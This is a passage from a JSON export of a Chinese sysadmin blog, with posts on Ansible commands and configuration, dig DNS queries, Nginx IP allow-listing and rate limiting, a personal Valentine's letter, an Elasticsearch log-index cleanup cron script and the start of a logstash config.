连接类型使用。可能的选项是paramiko(SSH),SSH和地方。当地主要是用于crontab或启动。 --tags=TAGS 只执行指定标签的任务 例子:ansible-playbook test.yml --tags=copy 只执行标签为copy的那个任务 --list-hosts 只打印有哪些主机会执行这个 playbook 文件，不是实际执行该 playbook 文件 --list-tasks 列出所有将被执行的任务 -C, --check 只是测试一下会改变什么内容，不会真正去执行;相反,试图预测一些可能发生的变化 --syntax-check 执行语法检查的剧本,但不执行它 -l SUBSET, --limit=SUBSET 进一步限制所选主机/组模式 --limit=192.168.0.15 只对这个ip执行 --skip-tags=SKIP_TAGS 只运行戏剧和任务不匹配这些值的标签 --skip-tags=copy_start -e EXTRA_VARS, --extra-vars=EXTRA_VARS 额外的变量设置为键=值或YAML / JSON #cat update.yml --- - hosts: &#123;&#123; hosts &#125;&#125; remote_user: &#123;&#123; user &#125;&#125; .............. #ansible-playbook update.yml --extra-vars \"hosts=vipers user=admin\" 传递&#123;&#123;hosts&#125;&#125;、&#123;&#123;user&#125;&#125;变量,hosts可以是 ip或组名 -l,--limit 对指定的 主机/组 执行任务 --limit=192.168.0.10，192.168.0.11 或 -l 192.168.0.10，192.168.0.11 只对这个2个ip执行任务 2、ansible-doc123456789101112[root@docker ~]# ansible-doc -hUsage: ansible-doc [options] [module...]Options: -h, --help show this help message and exit -l, --list List available modules -M MODULE_PATH, --module-path=MODULE_PATH specify path(s) to module library (default=None) -s, --snippet Show playbook snippet for specified module(s) -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit 该指令用于查看模块信息，常用参数有两个-l 和 -s ，具体如下： 1234//列出所有已安装的模块# ansible-doc -l//查看具体某模块的用法，这里如查看command模块# ansible-doc -s command 3、ansible-galaxy12345678[root@docker ~]# ansible-galaxy -hUsage: ansible-galaxy [delete|import|info|init|install|list|login|remove|search|setup] [--help] [options] ...Options: -h, --help show this help message and exit -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit ansible-galaxy 指令用于方便的从https://galaxy.ansible.com/ 站点下载第三方扩展模块，我们可以形象的理解其类似于centos下的yum、python下的pip或easy_install 。如下示例： 12345[root@localhost ~]# ansible-galaxy install aeriscloud.docker- downloading role 'docker', owned by aeriscloud- downloading role from https://github.com/AerisCloud/ansible-docker/archive/v1.0.0.tar.gz- extracting aeriscloud.docker to /etc/ansible/roles/aeriscloud.docker- aeriscloud.docker was installed successfully 这个安装了一个aeriscloud.docker组件，前面aeriscloud是galaxy上创建该模块的用户名，后面对应的是其模块。在实际应用中也可以指定txt或yml 文件进行多个组件的下载安装。这部分可以参看官方文档。 这个安装了一个aeriscloud.docker组件，前面aeriscloud是galaxy上创建该模块的用户名，后面对应的是其模块。在实际应用中也可以指定txt或yml 文件进行多个组件的下载安装。这部分可以参看官方文档。 4、ansible-lintansible-lint是对playbook的语法进行检查的一个工具。用法是ansible-lint playbook.yml 。 5、ansible-playbook该指令是使用最多的指令，其通过读取playbook 文件后，执行相应的动作，这个后面会做为一个重点来讲。 6、ansible-pull该指令使用需要谈到ansible的另一种模式－－－pull 模式，这和我们平常经常用的push模式刚好相反，其适用于以下场景：你有数量巨大的机器需要配置，即使使用非常高的线程还是要花费很多时间；你要在一个没有网络连接的机器上运行Anisble，比如在启动之后安装。这部分也会单独做一节来讲。 7、ansible-vaultansible-vault主要应用于配置文件中含有敏感信息，又不希望他能被人看到，vault可以帮你加密/解密这个配置文件，属高级用法。主要对于playbooks里比如涉及到配置密码或其他变量时，可以通过该指令加密，这样我们通过cat看到的会是一个密码串类的文件，编辑的时候需要输入事先设定的密码才能打开。这种playbook文件在执行时，需要加上 –ask-vault-pass参数，同样需要输入密码后才能正常执行。具体该部分可以参查官方博客。 注：上面七个指令，用的最多的只有两个ansible 和ansible-playbook ，这两个一定要掌握，其他五个属于拓展或高级部分。","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible小结（三）ansible.cfg与默认配置","slug":"自动化+可视化/Ansible/Ansible小结（三）ansible.cfg与默认配置 ","date":"2016-03-07T09:56:03.000Z","updated":"2017-03-14T05:51:59.000Z","comments":true,"path":"2016/03/07/自动化+可视化/Ansible/Ansible小结（三）ansible.cfg与默认配置 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/07/自动化+可视化/Ansible/Ansible小结（三）ansible.cfg与默认配置 /","excerpt":"","text":"#Ansible小结（四）ansible.cfg与默认配置 Ansible默认安装好后有一个配置文件/etc/ansible/ansible.cfg，该配置文件中定义了ansible的主机的默认配置部分，如默认是否需要输入密码、是否开启sudo认证、action_plugins插件的位置、hosts主机组的位置、是否开启log功能、默认端口、key文件位置等等。 具体如下： 123456789101112131415161718192021222324252627282930313233[defaults]# some basic default values...hostfile = /etc/ansible/hosts \\\\指定默认hosts配置的位置# library_path = /usr/share/my_modules/remote_tmp = $HOME/.ansible/tmppattern = *forks = 5poll_interval = 15sudo_user = root \\\\远程sudo用户#ask_sudo_pass = True \\\\每次执行ansible命令是否询问ssh密码#ask_pass = True \\\\每次执行ansible命令时是否询问sudo密码transport = smartremote_port = 22module_lang = Cgathering = implicithost_key_checking = False \\\\关闭第一次使用ansible连接客户端是输入命令提示log_path = /var/log/ansible.log \\\\需要时可以自行添加。chown -R root:root ansible.logsystem_warnings = False \\\\关闭运行ansible时系统的提示信息，一般为提示升级# set plugin path directories here, separate with colonsaction_plugins = /usr/share/ansible_plugins/action_pluginscallback_plugins = /usr/share/ansible_plugins/callback_pluginsconnection_plugins = /usr/share/ansible_plugins/connection_pluginslookup_plugins = /usr/share/ansible_plugins/lookup_pluginsvars_plugins = /usr/share/ansible_plugins/vars_pluginsfilter_plugins = /usr/share/ansible_plugins/filter_pluginsfact_caching = memory[accelerate]accelerate_port = 5099accelerate_timeout = 30accelerate_connect_timeout = 5.0# The daemon timeout is measured in minutes. This time is measured# from the last activity to the accelerate daemon.accelerate_daemon_timeout = 30 在ansible.cfg配置文件中，也会找到如下部分： 12# uncomment this to disable SSH key host checkinghost_key_checking = False 默认host_key_checking部分是注释的，通过找开该行的注释，同样也可以实现跳过 ssh 首次连接提示验证部分。 我这里做了免秘钥的查看日志如下： 12345678910111213141516171819[root@docker ~]# ansible tomcat_C1 -a \"uptime\"192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00[root@docker ~]#[root@docker ~]#[root@docker ~]# cat /var/log/ansible.log2016-09-05 09:19:23,235 p=1412 u=root | ERROR! Missing target hosts2016-09-05 09:19:54,580 p=1417 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:24 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:20:07,206 p=1440 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:20:37 up 24 days, 15:31, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:31,607 p=1460 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:01 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.002016-09-05 09:27:33,800 p=1482 u=root | 192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 09:28:03 up 24 days, 15:39, 4 users, load average: 0.00, 0.00, 0.00 更多部分可以参看官方文档","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible 学习入门","slug":"自动化+可视化/Ansible/ Ansible 学习入门 ","date":"2016-03-07T09:56:03.000Z","updated":"2017-03-14T05:52:11.000Z","comments":true,"path":"2016/03/07/自动化+可视化/Ansible/ Ansible 学习入门 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/07/自动化+可视化/Ansible/ Ansible 学习入门 /","excerpt":"","text":"Ansible介绍 学习ansible这里我自己做了简单的介绍总结： Ansible是一个自动化工具。它可以配置系统,部署软件,编排更高级的任务,比如连续部署或零停机时间滚动更新。 Ansible的目标是最简单和最易用。它也有一个强烈关注安全性和可靠性,以最少的移动部件,使用OpenSSH运输(加速插座模式和拉模式选择),和设计语言,人类可审核性的——甚至是那些不熟悉程序。 我们认为简单是所有大小的环境和相关的设计对于忙碌的所有类型的用户——这是否意味着开发人员、系统管理员,发布工程师,经理,无处不在。Ansible适合管理小设置少量的实例以及与许多成千上万的企业环境。 Ansible管理机器以最好的方式。没有一个问题如何升级远程守护进程或无法管理系统的问题因为守护进程是卸载。OpenSSH是最同行评议的开源组件,使用该工具的安全风险大大降低。Ansible是分散的,它依赖于现有的操作系统凭证来控制访问远程机器,如果需要使用Kerberos,它可以很容易地连接LDAP和其他管理系统的集中式身份验证。 Ansible是一个彻底的简单自动化引擎,自动化云配置,配置管理、应用程序部署,intra-service编排,以及许多其他的需求。 被设计为多层部署自第一天,Ansible模型你的IT基础设施,描述如何推动你所有的系统,而不仅仅是管理一个系统。 它使用没有代理,没有额外的自定义安全基础设施,所以很容易部署,最重要的是,它使用一个非常简单的语言(YAML Ansible Playbooks的形式),让你描述你的自动化工作的方式方法简明英语。 我们利用Ansible主要是作为内网服务器的一些管理，因为他用ssh来管理配置，内网同学还是很快速的，外网主要是利用Saltstack，利用消息队列远程通信，我感觉是比Ansible好的。 为什么选择ansible Ansible大家都知道，和salt/puppet等一样，是一款配置管理工具。为什么选择它，就是因为它简单，不需要安装agent，只要服务器能用ssh访问，就可以使用它去管理大家如果要问，和我用rsync直接同步或写个for循环执行rpm或yum有什么区别. 我想最大的区别应该就是“并发”当然，大企业会自己去开发自己的持续部署平台，而大部分的还是中小型企业 其实部署每个环节都可以用rpm安装发布。 我们的某个应用直接构建成rpm，是直接放到我们另一个内部服务器中，提供http接口，然后执行的就是yum模块进行安装。 也有人问我salt有没有用过。其实我们最初是使用salt的，后来因为网络的原因，选择了没有agent的ansible。在阿里云上面还是salt去服务管理。 参考官网入门学习视频","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"DNS服务使用dig查询解析","slug":"DNS/DNS服务使用dig查询解析","date":"2016-02-28T12:39:51.000Z","updated":"2017-03-16T06:19:21.000Z","comments":true,"path":"2016/02/28/DNS/DNS服务使用dig查询解析/","link":"","permalink":"http://blog.yangcvo.me/2016/02/28/DNS/DNS服务使用dig查询解析/","excerpt":"","text":"##使用dig查询DNS解析 今天整理下前段时间搭建的DNS主从服务器，DNS主从复制虚拟域名设置等等，总结写了篇文档：DNS服务器主从复制搭建 这里就顺便写了下dig使用查询DNS解析： 一般来说linux下查询域名解析有两种选择，nslookup或者dig，而在使用上我觉得dig更加方便顺手。如果是在centos下的话，只要yum装上dig这个包就可以使用dig命令了。 nslookup 使用在我印象中在读大学Windows服务器用的非常多。 最基本的使用方式就是 1dig rap.test.intranet. 12345678910111213141516171819202122232425262728[root@DNS-master ~]# dig rap.test.intranet.; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-29.el7_2.3 &lt;&lt;&gt;&gt; rap.test.intranet.;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40150;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;rap.test.intranet. IN A;; ANSWER SECTION:rap.test.intranet. 1200 IN A 192.168.1.211;; AUTHORITY SECTION:test.intranet. 1200 IN NS ns1.test.intranet.test.intranet. 1200 IN NS ns2.test.intranet.;; ADDITIONAL SECTION:ns1.test.intranet. 1200 IN A 192.168.1.204ns2.test.intranet. 1200 IN A 192.168.1.205;; Query time: 0 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: 三 9月 14 14:47:45 CST 2016;; MSG SIZE rcvd: 130 即查询域名的A记录，查询的dns服务器将采用系统配置的服务器，即/etc/resovle.conf 中的。如果要查询其他类型的记录，比如MX，CNAME，NS，PTR等，只需将类型加在命令后面即可 12dig rap.test.intranet mxdig rap.test.intranet ns 此外，如果你是一个系统管理员，部署好了一台dns服务器之后想对它进行解析测试，就必须要显式指定待测试的dns服务器地址了，例如: 1dig @1.168.192 rap.test.intranet a 默认情况下dig将采用udp协议进行查询，如果要采用tcp方式，可以加上 +tcp参数1dig rap.test.intranet a +tcp 另外一个重要的功能是+trace参数，使用这个参数之后将显示从根域逐级查询的过程 1dig rap.test.intranet a +trace 1234567891011121314151617181920212223242526272829[root@DNS-master ~]# dig rap.test.intranet a +trace; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-29.el7_2.3 &lt;&lt;&gt;&gt; rap.test.intranet a +trace;; global options: +cmd. 329687 IN NS g.root-servers.net.. 329687 IN NS a.root-servers.net.. 329687 IN NS j.root-servers.net.. 329687 IN NS d.root-servers.net.. 329687 IN NS e.root-servers.net.. 329687 IN NS c.root-servers.net.. 329687 IN NS l.root-servers.net.. 329687 IN NS i.root-servers.net.. 329687 IN NS f.root-servers.net.. 329687 IN NS m.root-servers.net.. 329687 IN NS b.root-servers.net.. 329687 IN NS k.root-servers.net.. 329687 IN NS h.root-servers.net.. 518303 IN RRSIG NS 8 0 518400 20160927050000 20160914040000 46551 . oGlpdQKJ+s6h7AW/HfNVN6w8zzrwU8Q5LP4So9LP65JBqHQqLDtpNz1j OtTiJVwdpxlF/uTQ1HOqUVNOxV7Anpcj08x/LXjCQYUco2X12/Gxats6 oX1h9FfzFtd3JKrxuo08x7fBQ7uVY9WvkHW/AcWCIRBMMpuIJqZcHlGz 92c=;; Received 941 bytes from 127.0.0.1#53(127.0.0.1) in 1421 ms. 86400 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2016091400 1800 900 604800 86400. 86400 IN RRSIG SOA 8 0 86400 20160927050000 20160914040000 46551 . t2MmM3Ei/JkicFHIjsQHz4vOvfld02aXKa4Jc3cHHnzTYQ6sqcKBGoNB mhrSs51ImUQj7SXjm9T4xb7ZvnzezqWqNA2mQc6j2eFHcJgtIfryitIt WumvYo6j3PzgufTtlidWob60Y7KE0sy3Y1g3jVKwjH9YFE+8imwEPhiI vhY=international. 86400 IN NSEC intuit. NS DS RRSIG NSECinternational. 86400 IN RRSIG NSEC 8 1 86400 20160927050000 20160914040000 46551 . PBLSHTQ/qRan5U7tZ2KEIJkQaOs356o0YRJP2SY+WjCwOfBRcVb6ljYG pgh+X45M1IXFzOEs5V36UmNZ9EZ5m+hy67dQs64Mam10WTRHsmO55RCN abR8nkLuAU20qdp2d5RbqlPUPqOmvLMhmxFwy2eRW+4+OdSmEwaYKubP YSc=. 86400 IN NSEC aaa. NS SOA RRSIG NSEC DNSKEY. 86400 IN RRSIG NSEC 8 0 86400 20160927050000 20160914040000 46551 . PlKRTXs02kT6qpQJw2FJibwuU56Olwo5hEzXZ4X6DQ4ONUI76mpAWuKM jtZi2OK111STK6cehRK/RTfH6qX8YF+06DpGxLkJx9oShk/G5Zj9xXid 7CRDf9ccpC+740iGK/KSWdE36LCkPw+6lU9oyXlFbqhS0YDRz4xuzbqi pSc=;; Received 662 bytes from 192.58.128.30#53(j.root-servers.net) in 120 ms 比如，对本站域名 rap.test.intranet A记录的trace查询可以看到根域.，顶级域.intranet，以及test.intranet的域名权威服务器的地址及其各自的返回结果，这样对于追踪dns解析中的问题有很大的帮助。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://blog.yangcvo.me/tags/DNS/"}]},{"title":"Python学习一路潇潇洒洒磕磕碰碰😁","slug":"python/Python学习一路潇潇洒洒磕磕碰碰😁","date":"2016-02-26T10:48:10.000Z","updated":"2017-05-05T07:15:47.000Z","comments":true,"path":"2016/02/26/python/Python学习一路潇潇洒洒磕磕碰碰😁/","link":"","permalink":"http://blog.yangcvo.me/2016/02/26/python/Python学习一路潇潇洒洒磕磕碰碰😁/","excerpt":"","text":"Python运维编程 （第一关）Topics Python介绍（不详讲） 安装、环境准备 （不详细讲） 学习 输入和输出 （raw_input）和（print） 12&gt;&gt;&gt;name = raw_input('please enter your name: ')print 'hello,', name 学习 Python基础 应该始终坚持使用4个空格的缩进.","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"http://blog.yangcvo.me/categories/Python/"}],"tags":[]},{"title":"Nginx限制IP访问权限或限制某个IP同一时间段的访问次数","slug":"Web服务技术/Nginx/Nginx限制IP访问权限或限制某个IP同一时间段的访问次数","date":"2016-02-25T09:25:23.000Z","updated":"2017-03-31T10:45:07.000Z","comments":true,"path":"2016/02/25/Web服务技术/Nginx/Nginx限制IP访问权限或限制某个IP同一时间段的访问次数/","link":"","permalink":"http://blog.yangcvo.me/2016/02/25/Web服务技术/Nginx/Nginx限制IP访问权限或限制某个IP同一时间段的访问次数/","excerpt":"","text":"nginx限制ip访问 nginx访问权限看下配置： 这里我只允许我公司IP访问： 12345678910111213141516 server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; 这里分全局配置和站点配置。这里我kibana网站只限制当个网站IP访问： 一、服务器全局限IP 123#vi nginx.conf allow 202.107.202.82/32; #允许的IP deny all; 二、站点限IP 123456#vi vhosts.conf站点全局限IP:location / &#123; index index.html index.htm index.php; allow 202.107.202.82/32; deny all; 如何设置能限制某个IP某一时间段的访问次数如何设置能限制某个IP某一时间段的访问次数是一个让人头疼的问题，特别面对恶意的ddos攻击的时候。其中CC攻击（Challenge Collapsar）是DDOS（分布式拒绝服务）的一种，也是一种常见的网站攻击方法，攻击者通过代理服务器或者肉鸡向向受害主机不停地发大量数据包，造成对方服务器资源耗尽，一直到宕机崩溃。 cc攻击一般就是使用有限的ip数对服务器频繁发送数据来达到攻击的目的，nginx可以通过HttpLimitReqModul和HttpLimitZoneModule配置来限制ip在同一时间段的访问次数来防cc攻击。 HttpLimitReqModul用来限制连单位时间内连接数的模块，使用limit_req_zone和limit_req指令配合使用来达到限制。一旦并发连接超过指定数量，就会返回503错误。 HttpLimitConnModul用来限制单个ip的并发连接数，使用limit_zone和limit_conn指令 这两个模块的区别前一个是对一段时间内的连接数限制，后者是对同一时刻的连接数限制 ####HttpLimitReqModul 限制某一段时间内同一ip访问数实例 123456789101112131415161718192021222324252627282930http&#123; ... #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存， #以$binary_remote_addr 为key,限制平均每秒的请求为20个， #1M能存储16000个状态，rete的值必须为整数， #如果限制两秒钟一个请求，可以设置成30r/m limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; ... server&#123; ... location &#123; ... #限制每ip每秒不超过20个请求，漏桶数burst为5 #brust的意思就是，如果第1秒、2,3,4秒请求为19个， #第5秒的请求为25个是被允许的。 #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。 #nodelay，如果不设置该选项，严格使用平均速率限制请求数， #第1秒25个请求时，5个请求放到第2秒执行， #设置nodelay，25个请求将在第1秒执行。 limit_req zone=allips burst=5 nodelay; ... &#125; ... &#125; ...&#125; HttpLimitZoneModule 限制并发连接数实例limit_zone只能定义在http作用域，limit_conn可以定义在http server location作用域 123456789101112131415161718192021222324http&#123; ... #定义一个名为one的limit_zone,大小10M内存来存储session， #以$binary_remote_addr 为key #nginx 1.18以后用limit_conn_zone替换了limit_conn #且只能放在http作用域 limit_conn_zone one $binary_remote_addr 10m; ... server&#123; ... location &#123; ... limit_conn one 20; #连接数限制 #带宽限制,对单个连接限数，如果一个ip两个连接，就是500x2k limit_rate 500k; ... &#125; ... &#125; ...&#125; nginx白名单设置以上配置会对所有的ip都进行限制，有些时候我们不希望对搜索引擎的蜘蛛或者自己测试ip进行限制，对于特定的白名单ip我们可以借助geo指令实现。1. 123456789101112131415161718192021222324252627282930313233http&#123; geo $limited&#123; default 1; #google 64.233.160.0/19 0; 65.52.0.0/14 0; 66.102.0.0/20 0; 66.249.64.0/19 0; 72.14.192.0/18 0; 74.125.0.0/16 0; 209.85.128.0/17 0; 216.239.32.0/19 0; #M$ 64.4.0.0/18 0; 157.60.0.0/16 0; 157.54.0.0/15 0; 157.56.0.0/14 0; 207.46.0.0/16 0; 207.68.192.0/20 0; 207.68.128.0/18 0; #yahoo 8.12.144.0/24 0; 66.196.64.0/18 0; 66.228.160.0/19 0; 67.195.0.0/16 0; 74.6.0.0/16 0; 68.142.192.0/18 0; 72.30.0.0/16 0; 209.191.64.0/18 0; #My IPs 127.0.0.1/32 0; 123.456.0.0/28 0; #example for your server CIDR &#125; geo指令定义了一个白名单$limited变量，默认值为1，如果客户端ip在上面的范围内，$limited的值为0 2.使用map指令映射搜索引擎客户端的ip为空串，如果不是搜索引擎就显示本身真是的ip，这样搜索引擎ip就不能存到limit_req_zone内存session中，所以不会限制搜索引擎的ip访问 map $limited $limit {1 $binary_remote_addr;0 “”;} 3.设置limit_req_zone和limit_reqlimit_req_zone $limit zone=foo:1m rate=10r/m; limit_req zone=foo burst=5; 最后我们使用ab压php-fpm的方式，对上面的方法效果实际测试下 例1：限制只允许一分钟内只允许一个ip访问60次配置，也就是平均每秒1次首先我们准备一个php脚本放在根目录下$document_root test.php 123for( $i=0; $i &lt; 1000; $i++)echo 'Hello World';?&gt; nginx配置增加limit_req_zone 和 limit_req 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:06 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:06:27:07 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" 未设置brust和nodelay可以看到该配置只允许每秒访问1次，超出的请求返回503错误 123456789101112131415http&#123; ... limit_req_zone $binary_remote_addr zone=allips:10m rate=60r/m; ... server&#123; ... location &#123; ... limit_req zone=allips burst=1 nodelay; ... &#125; ... &#125; ...&#125; ab -n 5 -c 1 http://www.weizhang.org/test.php 12345118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:00 +0000] \"GET /test.php HTTP/1.0\" 200 11000 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\"118.144.94.193 - - [22/Dec/2012:07:01:01 +0000] \"GET /test.php HTTP/1.0\" 503 537 \"-\" \"ApacheBench/2.3\" 设置brust=1和nodelay后允许第1秒处理两个请求。 参考例子：http://storysky.blog.51cto.com/628458/642970/","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"在一起的第588天💕","slug":"个人生活记录/在一起的第588天💕","date":"2016-02-14T14:04:06.000Z","updated":"2017-03-14T05:55:48.000Z","comments":true,"path":"2016/02/14/个人生活记录/在一起的第588天💕/","link":"","permalink":"http://blog.yangcvo.me/2016/02/14/个人生活记录/在一起的第588天💕/","excerpt":"","text":"今天2016年2月14日我们的第二个情人节： 夜已经很深了，我还坐在电脑前写信给你,慢慢把我们在一起点点滴滴记录下来,这些天总是有很多话想对你说,但对你的思念扰乱了我所有的思绪。我不知道该说些什么或怎么说？说心里话，和你的每一天我很快乐很幸福，是我一生中从未有过的！真的XXL。 在这个13亿茫茫人海当中，你已我相距1325公里因缘分而相识，因相趣而相知，你是一个文文静静，高高大大，很懂事，很孝顺的女孩子，懂的体贴别人，关爱自己身边的人，你一米72，我一米八，走在一起别人总说我们很般配,其实我听了心里还是廷美滋滋的，因为很幸福. 知道么，和你在一起，已经过了不知不觉的1年228天了，和你在一起的日子，总是太快太短促了，还记得我们的相识么？-_-，那已经是在一年前的事情了。2014年9月23日，很清楚的记得当时的情景，我是老板，你是买家，因为一件衣服的聊起来了，但是保留在我计算机中的聊天记录却让你我回忆起曾经美好的种种经历，和你一起上网看我们的记录，我们那些日子一起说好的旅行，我们那些彼此约定，都一一兑现了。看着你甜蜜的微笑便要为这个人努力奋斗，因为，我爱你！ 虽然我们在异地，可是我们爱对彼此是那么信任感情的坚定，现在……却沉浸在和你在一起的美好的日子里，受到了一群好朋友的关心满满的祝福，我很满足……满足！","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]},{"title":"elasticsearch的索引定时自动清理","slug":"日志分析\u0010平台/Elasticsearch/elasticsearch的索引定时自动清理","date":"2016-01-30T09:56:03.000Z","updated":"2017-05-04T16:13:14.000Z","comments":true,"path":"2016/01/30/日志分析\u0010平台/Elasticsearch/elasticsearch的索引定时自动清理/","link":"","permalink":"http://blog.yangcvo.me/2016/01/30/日志分析\u0010平台/Elasticsearch/elasticsearch的索引定时自动清理/","excerpt":"","text":"elasticsearch的索引定时自动清理之前用 logstash来做日志收集 并用 elasticsearch来搜索，因为日志没有进行过滤，没几天就发现elasticsearch的索引文件大的吓人，之前还真没清理过。其实要说清理也简单，直接到 elasticsearch data文件夹里删掉就行了，写个脚本定期清理集群es的日志数据。 这里我清理1月7号的。 这里后面是索引名称。app_error-2017.01.07 12[root@es_01 sh]# curl -XDELETE 'http://10.47.88.206:9200/app_error-2017.01.07'&#123;\"acknowledged\":true&#125;[root@es_01 sh]# shell 7天清理一次数据写在计划任务里面： 12345678910#!/bin/bashnow=`date +%Y%m%d`echo $nowdays_07_before=`date -d \"$now 7 days ago\" +%Y.%m.%d`echo $days_30_beforecurl -XDELETE \"http://10.47.88.206:9200/app_error-$days_07_before\" &gt; /dev/null 2&gt;&amp;1curl -XDELETE \"http://10.47.88.206:9200/app_info-$days_07_before\" &gt; /dev/null 2&gt;&amp;1curl -XDELETE \"http://10.47.88.206:9200/logback_app_error-$days_07_before\" &gt; /dev/null 2&gt;&amp;1curl -XDELETE \"http://10.47.88.206:9200/logback_app_info-$days_07_before\" &gt; /dev/null 2&gt;&amp;1 计划任务： 110 0 * * * /opt/sh/logstash-null.sh","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"logstash如何写tomcat,redis,nginx日志收集规则","slug":"日志分析\u0010平台/Elasticsearch/logstash如何收集tomcat日志分析","date":"2016-01-29T09:56:03.000Z","updated":"2017-04-12T13:42:58.000Z","comments":true,"path":"2016/01/29/日志分析\u0010平台/Elasticsearch/logstash如何收集tomcat日志分析/","link":"","permalink":"http://blog.yangcvo.me/2016/01/29/日志分析\u0010平台/Elasticsearch/logstash如何收集tomcat日志分析/","excerpt":"","text":"logstash如何收集tomcat日志分析（可以参考我下面写的模板）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162我想实现对tomcat的日志采集，正常应该创建一个file的input，这个input指定了监听的文件或者目录....然后过滤器（如果没有特殊要求，先可以不进行解析，原始的日志直接存就行）....最后使用一个elastcisearch插件，发送到es中去.input &#123; stdin&#123;&#125; file &#123; type =&gt; \"tomcat_card\" path =&gt; \"/srv/tomcat/logs/card/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_family\" path =&gt; \"/srv/tomcat/logs/family/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_mission\" path =&gt; \"/srv/tomcat/logs/mission/*.log\" start_position =&gt; \"beginning\" &#125;&#125;filter &#123; grok &#123; match =&gt; [ \"message\", \"%&#123;TIMESTAMP_ISO8601:logdate&#125; 